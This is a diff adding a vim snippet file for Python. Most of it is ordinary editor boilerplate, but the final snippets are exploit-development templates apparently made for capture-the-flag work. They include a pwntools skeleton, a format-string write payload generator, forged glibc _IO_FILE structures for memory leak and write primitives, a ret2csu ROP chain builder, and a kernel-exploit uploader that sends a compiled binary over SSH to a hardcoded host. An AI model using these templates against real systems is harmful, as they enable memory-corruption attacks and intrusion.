@@ -1,0 +1,656 @@
+snippet #!
+	#!/usr/bin/env python3
+snippet #!2
+	#!/usr/bin/env python2
+	# -*- coding: utf-8 -*-
+snippet #!3
+	#!/usr/bin/env python3
+snippet imp
+	import ${0:module}
+snippet uni
+	def __unicode__(self):
+		${0:representation}
+snippet from
+	from ${1:package} import ${0:module}
+# Module Docstring
+snippet docs
+	"""
+	File: ${1:`vim_snippets#Filename('$1.py', 'foo.py')`}
+	Author: `g:snips_author`
+	Email: `g:snips_email`
+	Github: `g:snips_github`
+	Description: ${0}
+	"""
+
+# Unittest skip
+snippet sk "skip unittests" b
+	@unittest.skip(${1:skip_reason})
+
+snippet wh
+	while ${1:condition}:
+		${0:${VISUAL}}
+# dowh - does the same as do...while in other languages
+snippet dowh
+	while True:
+		${1}
+		if ${0:condition}:
+			break
+snippet with
+	with ${1:expr} as ${2:var}:
+		${0:${VISUAL}}
+snippet awith
+	async with ${1:expr} as ${2:var}:
+		${0:${VISUAL}}
+# New Class
+snippet cl
+	class ${1:ClassName}(${2:object}):
+		"""${3:docstring for $1}"""
+		def __init__(self, ${4:arg}):
+			${5:super($1, self).__init__()}
+			self.$4 = $4
+			${0}
+snippet cla
+	class ${1:class_name}:
+		"""${0:description}"""
+snippet clai
+	class ${1:class_name}:
+		"""${2:description}"""
+		def __init__(self, ${3:args}):
+			${0}
+# New Function
+snippet def
+	def ${1:fname}(${2:`indent('.') ? 'self' : ''`}):
+		"""${3:docstring for $1}"""
+		${0}
+snippet deff
+	def ${1:fname}(${2:`indent('.') ? 'self' : ''`}):
+		${0}
+snippet adef
+	async def ${1:fname}(${2:`indent('.') ? 'self' : ''`}):
+		"""${3:docstring for $1}"""
+		${0}
+snippet adeff
+	async def ${1:fname}(${2:`indent('.') ? 'self' : ''`}):
+		${0}
+# New Method
+snippet defi
+	def __init__(self, ${1:args}):
+		${0}
+snippet defm
+	def ${1:mname}(self, ${2:arg}):
+		${0}
+snippet adefm
+	async def ${1:mname}(self, ${2:arg}):
+		${0}
+
+# New Property
+snippet property
+	def ${1:foo}():
+		doc = "${2:The $1 property.}"
+		def fget(self):
+			${3:return self._$1}
+		def fset(self, value):
+			${4:self._$1 = value}
+		def fdel(self):
+			${0:del self._$1}
+		return locals()
+	$1 = property(**$1())
+# Ifs
+snippet if
+	if ${1:condition}:
+		${0:${VISUAL}}
+snippet el
+	else:
+		${0:${VISUAL}}
+snippet ei
+	elif ${1:condition}:
+		${0:${VISUAL}}
+# For
+snippet for
+	for ${1:item} in ${2:items}:
+		${0}
+# Encodes
+snippet cutf8
+	# -*- coding: utf-8 -*-
+snippet clatin1
+	# -*- coding: latin-1 -*-
+snippet cascii
+	# -*- coding: ascii -*-
+# Lambda
+snippet ld
+	${1:var} = lambda ${2:vars} : ${0:action}
+snippet ret
+	return ${0}
+snippet .
+	self.
+snippet try Try/Except
+	try:
+		${1:${VISUAL}}
+	except ${2:Exception} as ${3:e}:
+		${0:raise $3}
+snippet trye Try/Except/Else
+	try:
+		${1:${VISUAL}}
+	except ${2:Exception} as ${3:e}:
+		${4:raise $3}
+	else:
+		${0}
+snippet tryf Try/Except/Finally
+	try:
+		${1:${VISUAL}}
+	except ${2:Exception} as ${3:e}:
+		${4:raise $3}
+	finally:
+		${0}
+snippet tryef Try/Except/Else/Finally
+	try:
+		${1:${VISUAL}}
+	except ${2:Exception} as ${3:e}:
+		${4:raise $3}
+	else:
+		${5}
+	finally:
+		${0}
+# if __name__ == '__main__':
+snippet ifmain
+	if __name__ == '__main__':
+		${0:main()}
+# __magic__
+snippet _
+	__${1:init}__
+# python debugger (pdb)
+snippet pdb
+	__import__('pdb').set_trace()
+# bpython debugger (bpdb)
+snippet bpdb
+	__import__('bpdb').set_trace()
+# ipython debugger (ipdb)
+snippet ipdb
+	__import__('ipdb').set_trace()
+# embed ipython itself
+snippet iem
+	__import__('IPython').embed()
+# remote python debugger (rpdb)
+snippet rpdb
+	__import__('rpdb').set_trace()
+# web python debugger (wdb)
+snippet wdb
+	__import__('wdb').set_trace()
+# ptpython
+snippet ptpython
+	__import__('ptpython.repl', fromlist=('repl')).embed(globals(), locals(), vi_mode=${1:False}, history_filename=${2:None})
+# python console debugger (pudb)
+snippet pudb
+	__import__('pudb').set_trace()
+# pdb in nosetests
+snippet nosetrace
+	__import__('nose').tools.set_trace()
+snippet pprint
+	__import__('pprint').pprint(${1})
+snippet "
+	"""${0:doc}
+	"""
+# assertions
+snippet a=
+	self.assertEqual(${0}, ${1})
+# test function/method
+snippet test
+	def test_${1:description}(${2:`indent('.') ? 'self' : ''`}):
+		${0}
+# test case
+snippet testcase
+	class ${1:ExampleCase}(unittest.TestCase):
+
+		def test_${2:description}(self):
+			${0}
+# test given when then
+snippet tgwt
+	# given: ${1}
+	# when: ${2}
+	# then: ${3}
+snippet fut
+	from __future__ import ${0}
+#getopt
+snippet getopt
+	try:
+		# Short option syntax: "hv:"
+		# Long option syntax: "help" or "verbose="
+		opts, args = getopt.getopt(sys.argv[1:], "${1:short_options}", [${2:long_options}])
+
+	except getopt.GetoptError, err:
+		# Print debug info
+		print str(err)
+		${3:error_action}
+
+	for option, argument in opts:
+		if option in ("-h", "--help"):
+			${0}
+		elif option in ("-v", "--verbose"):
+			verbose = argument
+# argparse
+snippet addp
+	parser = ${VISUAL:argparse.}ArgumentParser()
+snippet addsp
+	${0:sub_parser} = parser.add_subparsers().add_parser("${1:name}")
+snippet addarg
+	parser.add_argument("${0:short_arg}", "${1:long_arg}", default=${2:None}, help="${3:Help text}")
+snippet addnarg
+	parser.add_argument("${0:arg}", nargs="${1:*}", default"${2:None}, help="${3:Help text}")
+snippet addaarg
+	parser.add_argument("${0:arg}", "${1:long_arg}", action="${2:store_true}", default=${3:False}, help="${4:Help text}")
+snippet pargs
+	"${VISUAL:return }"parser.parse_args()
+
+# logging
+# glog = get log
+snippet glog
+	import logging
+	LOGGER = logging.getLogger(${0:__name__})
+snippet le
+	LOGGER.error(${0:msg})
+# conflict with lambda=ld, therefor we change into Logger.debuG
+snippet lg
+	LOGGER.debug(${0:msg})
+snippet lw
+	LOGGER.warning(${0:msg})
+snippet lc
+	LOGGER.critical(${0:msg})
+snippet li
+	LOGGER.info(${0:msg})
+snippet epydoc
+	"""${1:Description}
+
+	@param ${2:param}: ${3: Description}
+	@type  $2: ${4: Type}
+
+	@return: ${5: Description}
+	@rtype : ${6: Type}
+
+	@raise e: ${0: Description}
+	"""
+snippet dol
+	def ${1:__init__}(self, *args, **kwargs):
+	    super(${0:ClassName}, self).$1(*args, **kwargs)
+snippet kwg
+	self.${1:var_name} = kwargs.get('$1', ${2:None})
+snippet lkwg
+	${1:var_name} = kwargs.get('$1', ${2:None})
+snippet args
+	*args${1:,}${0}
+snippet kwargs
+	**kwargs${1:,}${0}
+snippet akw
+	*args, **kwargs${1:,}${0}
+
+# comprehensions
+snippet lcp list comprehension
+	[${1} for ${2} in ${3:${VISUAL}}]${0}
+
+snippet dcp dict comprehension
+	{${1}: ${2} for ${3} in ${4:${VISUAL}}}${0}
+
+snippet scp set comprehension
+	{${1} for ${2} in ${3:${VISUAL}}}${0}
+
+snippet contain "methods for emulating a container type" b
+	def __len__(self):
+		${1:pass}
+
+	def __getitem__(self, key):
+		${2:pass}
+
+	def __setitem__(self, key, value):
+		${3:pass}
+
+	def __delitem__(self, key):
+		${4:pass}
+
+	def __iter__(self):
+		${5:pass}
+
+	def __reversed__(self):
+		${6:pass}
+
+	def __contains__(self, item):
+		${7:pass}
+
+snippet context "context manager methods" b
+	def __enter__(self):
+		${1:pass}
+
+	def __exit__(self, exc_type, exc_value, traceback):
+		${2:pass}
+
+snippet attr "methods for customizing attribute access" b
+	def __getattr__(self, name):
+		${1:pass}
+
+	def __setattr__(self, name, value):
+		${2:pass}
+
+	def __delattr__(self, name):
+		${3:pass}
+
+snippet desc "methods implementing descriptors" b
+	def __get__(self, instance, owner):
+		${1:pass}
+
+	def __set__(self, instance, value):
+		${2:pass}
+
+	def __delete__(self, instance):
+		${3:pass}
+
+snippet cmp "methods implementing rich comparison"
+	def __eq__(self, other):
+		${1:pass}
+
+	def __ne__(self, other):
+		${2:pass}
+
+	def __lt__(self, other):
+		${3:pass}
+
+	def __le__(self, other):
+		${4:pass}
+
+	def __gt__(self, other):
+		${5:pass}
+
+	def __ge__(self, other):
+		${6:pass}
+
+	def __cmp__(self, other):
+		${7:pass}
+
+snippet repr "methods implementing string representation"
+	def __repr__(self):
+		${1:pass}
+
+	def __str__(self):
+		${2:pass}
+
+	def __unicode__(self):
+		${3:pass}
+
+# note: reflected operands and augmented arithmeitc assignements have been
+# intentionally ommited to reduce verbosity.
+snippet numeric "methods for emulating a numeric type" b
+	def __add__(self, other):
+		${1:pass}
+
+	def __sub__(self, other):
+		${2:pass}
+
+	def __mul__(self, other):
+		${3:pass}
+
+	def __div__(self, other):
+		${4:pass}
+
+	def __truediv__(self, other):
+		${5:pass}
+
+	def __floordiv__(self, other):
+		${6:pass}
+
+	def __mod__(self, other):
+		${7:pass}
+
+	def __divmod__(self, other):
+		${8:pass}
+
+	def __pow__(self, other):
+		${9:pass}
+
+	def __lshift__(self, other):
+		${10:pass}
+
+	def __rshift__(self, other):
+		${11:pass}
+
+	def __and__(self, other):
+		${12:pass}
+
+	def __xor__(self, other):
+		${13:pass}
+
+	def __or__(self, other):
+		${14:pass}
+
+	def __neg__(self):
+		${15:pass}
+
+	def __pos__(self):
+		${16:pass}
+
+	def __abs__(self):
+		${17:pass}
+
+	def __invert__(self):
+		${18:pass}
+
+	def __complex__(self):
+		${19:pass}
+
+	def __int__(self):
+		${20:pass}
+
+	def __long__(self):
+		${21:pass}
+
+	def __float__(self):
+		${22:pass}
+
+	def __oct__(self):
+		${22:pass}
+
+	def __hex__(self):
+		${23:pass}
+
+	def __index__(self):
+		${24:pass}
+
+	def __coerce__(self, other):
+		${25:pass}
+
+
+snippet pwn
+	from pwn import *
+	if args['DEBUG']:
+		context.log_level = "debug"
+	code = ELF("${1:BIN}")
+	if args['REMOTE']:
+		conn = remote("127.0.0.1", 7777)
+	else:
+		conn = process("$1")
+
+	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+	conn.interactive()
+
+snippet fmt-vlun
+	def adjust(x):
+		if x == 0:
+			return 256
+		if x > 255:
+			while x > 255:
+				x -= 256
+		if x < 0:
+			while x < 0:
+				x += 256
+		return x
+
+	def round_up(n, align):
+		return (n + (align - 1)) & (~(align-1))
+
+	def fmt_vuln(offset, addr, val, is_x86 = False):
+		payload = ''
+		l = len(val)
+		val = '\x00' + val
+		regs = 0 if is_x86 else 6
+		addr_len = 4 if is_x86 else 8
+		payload_len = round_up(12*l, addr_len)
+		for i in range(1, len(val) ):
+			payload += '%{}c%{}$hhn'.format(adjust(ord(val[i]) - ord(val[i-1])), offset + i + regs - 1 + payload_len/addr_len)
+		payload = payload.ljust(payload_len,'a')
+		for i in range(l):
+			if is_x86:
+				payload += p32(addr + i)
+			else:
+				payload += p64(addr + i)
+		print '[payload]: ' + payload
+		return payload
+
+snippet iofile-leak
+	def fake_IO_file_leak(want_to_leak, leak_size, lock_addr, wide_data_addr):
+		#_IO_write_base->the begin of the leak addr
+		#_IO_write_ptr-> the end of the leak addr
+		# make IO_read_end=IO_write_base to bypass checks
+		flag=0xfbad2887
+		flag&=~8
+		flag|=0x800
+		fake_file=p64(flag)               #_flags
+		fake_file+=p64(0)                    #_IO_read_ptr
+		fake_file+=p64(want_to_leak)               #_IO_read_end
+		fake_file+=p64(0)                    #_IO_read_base
+		fake_file+=p64(want_to_leak)               #_IO_write_base
+		fake_file+=p64(want_to_leak+leak_size)             #_IO_write_ptr
+		fake_file+=p64(0)             #_IO_write_end
+		fake_file+=p64(0)                    #_IO_buf_base
+		fake_file+=p64(0)                    #_IO_buf_end
+		fake_file+=p64(0)                       #_IO_save_base
+		fake_file+=p64(0)                       #_IO_backup_base
+		fake_file+=p64(0)                       #_IO_save_end
+		fake_file+=p64(0)                       #_markers
+		fake_file+=p64(0)                       #chain   could be a anathor file struct
+		fake_file+=p32(1)                       #_fileno
+		fake_file+=p32(0)                       #_flags2
+		fake_file+=p64(0xffffffffffffffff)      #_old_offset
+		fake_file+=p16(0)                       #_cur_column
+		fake_file+=p8(0)                        #_vtable_offset
+		fake_file+=p8(0x10)                      #_shortbuf
+		fake_file+=p32(0)           
+		fake_file+=p64(lock_addr)                    #_lock
+		fake_file+=p64(0xffffffffffffffff)      #_offset
+		fake_file+=p64(0)                       #_codecvt
+		fake_file+=p64(wide_data_addr)                    #_wide_data
+		fake_file+=p64(0)                       #_freeres_list
+		fake_file+=p64(0)                       #_freeres_buf
+		fake_file+=p64(0)                       #__pad5
+		fake_file+=p32(0xffffffff)              #_mode
+		fake_file+=p32(0)                       #unused2
+		fake_file+=p64(0)*2                     #unused2
+
+snippet iofile-write
+	def fake_IO_file_leak(want_to_write, write_size, lock_addr, wide_data_addr):
+		# IO_write_ptr-> the begin of the write addr
+		# IO_write_end -> the end of the write addr
+		flag=0xfbad2887
+		#flag&=~4
+		#flag|=0x800
+		fake_file=p64(flag)               #_flags
+		fake_file+=p64(0)             #_IO_read_ptr
+		fake_file+=p64(0)             #_IO_read_end
+		fake_file+=p64(0)             #_IO_read_base
+		fake_file+=p64(0)             #_IO_write_base
+		fake_file+=p64(want_to_write)             #_IO_write_ptr
+		fake_file+=p64(want_to_write+write_size)         #_IO_write_end
+		fake_file+=p64(0)                    #_IO_buf_base
+		fake_file+=p64(0)                    #_IO_buf_end
+		fake_file+=p64(0)                       #_IO_save_base
+		fake_file+=p64(0)                       #_IO_backup_base
+		fake_file+=p64(0)                       #_IO_save_end
+		fake_file+=p64(0)                       #_markers
+		fake_file+=p64(0)                       #chain   could be a anathor file struct
+		fake_file+=p32(1)                       #_fileno
+		fake_file+=p32(0)                       #_flags2
+		fake_file+=p64(0xffffffffffffffff)      #_old_offset
+		fake_file+=p16(0)                       #_cur_column
+		fake_file+=p8(0)                        #_vtable_offset
+		fake_file+=p8(0x10)                      #_shortbuf
+		fake_file+=p32(0)           
+		fake_file+=p64(lock_addr)                    #_lock
+		fake_file+=p64(0xffffffffffffffff)      #_offset
+		fake_file+=p64(0)                       #_codecvt
+		fake_file+=p64(wide_data_addr)                    #_wide_data
+		fake_file+=p64(0)                       #_freeres_list
+		fake_file+=p64(0)                       #_freeres_buf
+		fake_file+=p64(0)                       #__pad5
+		fake_file+=p32(0xffffffff)              #_mode
+		fake_file+=p32(0)                       #unused2
+		fake_file+=p64(0)*2                     #unused2	
+
+snippet rop-csu
+	def csu(rbx, rbp, r12, r13, r14, r15, last):
+		csu_front_addr=0x0000000000400600
+		csu_end_addr=0x000000000040061A
+		# e.g.csu(0, 1, write_got, 8, write_got, 1, main_addr)
+		# pop rbx,rbp,r12,r13,r14,r15
+		# rbx should be 0,
+		# rbp should be 1,enable not to jump
+		# r12 should be the function we want to call
+		# rdi=edi=r15d
+		# rsi=r14
+		# rdx=r13
+		payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+		payload += p64(csu_front_addr)
+		payload += 'a' * 0x38
+		payload += p64(last)
+		return payload
+
+snippet kernel-pwn
+	#!/usr/bin/python
+	from pwn import *
+	
+	HOST = "35.221.78.115"
+	PORT =  10022
+	
+	USER = "pwn"
+	PW = "pwn"
+	
+	def compile():
+	    log.info("Compile")
+	    os.system("musl-gcc -w -s -static -o3 pwn2.c -o pwn")
+	
+	def exec_cmd(cmd):
+	    r.sendline(cmd)
+	    r.recvuntil("$ ")
+	
+	def upload():
+	    p = log.progress("Upload")
+	
+	    with open("pwn", "rb") as f:
+	        data = f.read()
+	
+	    encoded = base64.b64encode(data)
+	
+	    r.recvuntil("$ ")
+	
+	    for i in range(0, len(encoded), 300):
+	        p.status("%d / %d" % (i, len(encoded)))
+	        exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+300]))
+	
+	    exec_cmd("cat benc | base64 -d > bout")    
+	    exec_cmd("chmod +x bout")
+	
+	    p.success()
+	
+	def exploit(r):
+	    compile()
+	    upload()
+	
+	    r.interactive()
+	
+	    return
+	
+	if __name__ == "__main__":
+	    if len(sys.argv) > 1:
+	        session = ssh(USER, HOST, PORT, PW)
+	        r = session.run("/bin/sh")
+	        exploit(r)
+	    else:
+	        r = process("./startvm.sh")
+	        print util.proc.pidof(r)
+	        pause()
+	        exploit(r)
